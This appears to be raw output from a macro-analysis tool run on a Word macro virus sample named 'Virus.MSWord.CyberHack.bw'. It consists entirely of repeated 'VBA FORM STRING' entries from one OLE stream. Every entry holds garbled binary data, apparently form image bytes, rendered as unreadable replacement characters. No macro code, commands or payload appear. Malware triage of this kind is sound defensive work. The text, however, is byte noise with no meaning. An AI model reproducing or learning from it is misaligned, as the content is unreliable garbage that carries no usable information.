VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������ޭ�s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s�Ƅ����������kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kRcZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R�{R޵{������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!{J!sJ!sJ!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�R!�R!�R!�R!�R!��k���sZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�ޔ���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{���֭�֭�֭�֭�֭�Υ�Υ�Υ�Μ�Μ�Μ�Μ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�ν�Ƶ�11!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{Z�����ﭜs��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��k91!91!91!91!91!91!91!91!11!91!91!91!11!91!11!91!91!11!11!91!91!91!91!91!91!Ƶ���������޵�{��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s������������kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kR�kRcZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�{J�sJ�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J֭s������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!{J!sJ!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�R!��c���sJ!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J��R��R��R��R��s���)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ9ޭkޥc֥c֥cΜcΜZƜc��c��c��R��R��R��R�{J�{J�{J�{J)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{����֭�֭�֭�֭�֭�֭�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯν�ν�ν�ν�ν�ν�ν�ν�ν�ν��sZ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RJB��������s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s�������������kR�kR�kR�kR�kR�kR�kR�kR�sJ�sJ�kR�sJ�sJ�sJ�sJ�sJ�sJcZB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�sJ�sJ�kB�kB�sJ�kB�{J�{Jޭk������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!��c���sJ!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{J�{J�{J�{J�{J�{J�{J��R�{J��R�{J��R��R��R��R��R��RƜc����k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Μc��s��s�s�s�s�kޭkޭk֥c֥cΜcΜcΜcƜcƜc��c��R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s����֭�֭�֭�֭�֭�֭�֭�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�sZ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������{��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��sJB1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������ޭ�s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s�����������ތsJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sZ�sJ�sZ�sJ�{Z�sZ�sZ�{ZkcB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB֥c������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!{J!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!��c���cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�{J�{J�{J�{J�{J�{J�{J�{J��R��R��R��R��R��R��R��R��R������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�s�s�s�k�kޭkޭkޭk֥c֥cΜcΜcƜcƜcƜc��c�kB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s����޵�޵�֭�֭�֭�֭�֭�֭�֭�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�sZ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������Ɯ��{��{��{��{��{��{��{��{��{��s��{��s��s��s��{��{scJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kcB��������������s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s��s�����������ބ{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{ZkcB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kBޭk������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!{J!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!��c���cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{cB�{J�{J��R�{J�{J��R��R��R��R��R��R��R��R��R��R��R��R֥c��籠R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�s�k�k�k�kޭkޭkޭk֥c֥cΜcΜcΜcƜcƜcƜc��ckR9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s����޵�޵�޵�֭�֭�֭�֭�֭�֭�֭�֭�֭�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Ɯ�Ɯ�Υ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�sZ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������眵�{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������ƭ{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��s������������{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{Z�{ZscJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�k������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�R!�R!�R!�R!�R!�R!�R!�R!�R!�R!�R!��c���J1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kR9��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R������B1!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ޭk�k�k�k�k�kޭkޭkޭk֥c֥c֥cΜcΜcΜcƜcƜcƜcJ9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k����������޵�޵�޵�޵�޵�޵�޵�޵�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�{Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������������{��������{��{��{�����{��{��{kcB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RJB��������������{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��{��������������c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c�kR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�kB�kB�kB�kB�kB�kB�kB�kB�sJ�kB�sJ�kB�sJ�kB�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�sJ�{J�sJ�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�k������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�R!�R!{J!�R!�R!�R!�R!�R!�R!�R!�R!�R!�R!��k���9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��RƜc������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Rޭkޭkޭkޭkޭkޭkޭk֥k֥k֥k֥cΜcΜcΜcƜcƜcƜcƜc!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k�������������������޵�޵�޵�޵�޵�޵�޵�޵�޵�޵�޵�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�Υ�{Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ν������޽����������������������������������������������������{!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������ν������������������������������������������������������k��������������c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�kB�Z1�Z1�Z1�Z1�Z1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�k������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�R!�R!�R!�R!�R!�R!�R!�R!��k���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R��R��R��Z��Z��Z��Z��Z��Z��Z��Z��Z��c��c��c��c��c��c��c֥k����{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB޵s޵s޵s޵s޵s޵s޵sޭk֭k֥k֥k֥kΥkΥkΜcƜcƜcƜc��R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k�������������������������������������޵�޵�޵�޵�޵�޵�޵�޵�޵�޵�޵�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�Υ�Υ�Υ�Υ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
11!��������������������������������������������������������������s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ɯ����������֭������������������������������������������������������kcB��������������k��c��c��c��k��k��c��k��k��k��k��k��k��k��k��k��k��kZJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1ޜR������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�R!�R!�R!��s���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{cB��Z��Z��Z��Z��Z��Z��Z��Z��c��c��c��c��c��c��c��c��c��c��c�s�����s1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB޵s޵s޵s޵s޵s޵s޵s޵s֭s֭k֭k֥k֥kΥkΥkΥkΥkƜcƜc�kB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k����������������������������������������޵�޵�޵�޵�޵�޵�޵�Ɯ�Υ�޵�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�Υ�Υ�Υ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������֭������������������������������������������������������scJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k����������眽��������������������������������������������������������))
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������ƭ{��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R)�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1֜R������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�����s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z��Z��Z��Z��Z��c��c��c��c��c��c��c��c��c��c��c��c��c��c��cΥk�ޔ�΄cR1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{J֭k֭s޵s޵s޵s޵s֭s֭s֭s֭k֭k֥k֥kΥkΥkΥkΥkΥkƜkƜcB1!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k�������������������������������������������޵�޵�޵�޵�޵�޵���JB1�Υ�޵�޵�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�֭�ֽ�֭�֭�֭�Υ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kcB�����޽��������������������������������������������������������cZB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������֭����������������������������������������������������������{Z
-------------------------------------------------------------------------------
